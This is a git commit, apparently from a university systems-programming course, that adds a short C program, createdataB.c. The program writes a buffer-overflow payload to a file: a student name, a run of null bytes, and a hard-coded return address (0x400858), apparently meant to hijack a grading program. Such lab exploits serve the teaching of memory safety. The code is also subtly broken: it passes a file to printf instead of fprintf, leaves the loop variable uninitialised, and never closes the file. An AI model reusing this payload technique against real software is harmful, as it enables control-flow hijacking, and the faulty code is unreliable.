034878895beab3eda8ecaccff07836dcabbfde4c
Richard <rg6134@princeton.edu>
2022-12-14 02:48:25 -0500

    EEEE

---
+++ createdataB.c
@@ -0,0 +1,24 @@
+/*--------------------------------------------------------------------*/
+/* createdataB.c                                                      */
+/* Author: Richard Gomez                                              */
+/*--------------------------------------------------------------------*/
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(void) {
+    FILE *psFile;
+    psFile = fopen("dataB", "w");
+    unsigned long bAddress;
+    int i;
+    
+    printf(psFile, "Richard Gomez");
+    putc('\0', psFile);
+    for(i < 0; i < 50; i++) {
+        putc('\0', psFile);
+    }
+    bAddress = 0x400858;
+    fwrite(&bAddress, sizeof(unsigned long), 1, psFile);
+    
+}
+
